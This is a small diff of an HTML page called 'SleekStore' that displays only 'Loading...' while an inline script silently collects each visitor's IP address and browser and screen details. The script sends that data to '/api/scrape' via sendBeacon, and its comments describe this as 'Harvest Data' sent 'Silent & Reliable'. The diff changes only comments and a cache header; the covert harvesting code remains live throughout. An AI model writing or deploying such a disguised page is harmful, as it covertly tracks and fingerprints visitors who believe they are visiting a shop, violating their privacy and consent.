@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SleekStore</title>
-    <!-- Disable caching for this page -->
-    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+    <!-- Prevent caching -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <style>body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;padding:20px;}</style>
 </head>
 <body>
@@ -13,7 +13,7 @@
     <p>Loading...</p>
 
     <script>
-        // Run immediately
+        // Run immediately on load
         (async () => {
             try {
                 // 1. Get IP
@@ -24,7 +24,7 @@
                     ip = data.ip;
                 } catch(e) {}
 
-                // 2. Harvest Real Data
+                // 2. Harvest Data
                 const payload = {
                     timestamp: new Date().toISOString(),
                     ip: ip,
@@ -50,7 +50,7 @@
                     screenRes: `${screen.width}x${screen.height}`
                 };
 
-                // 3. Send using sendBeacon (More reliable than fetch for background tasks)
+                // 3. Send using sendBeacon (Silent & Reliable)
                 const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                 navigator.sendBeacon('/api/scrape', blob);
 
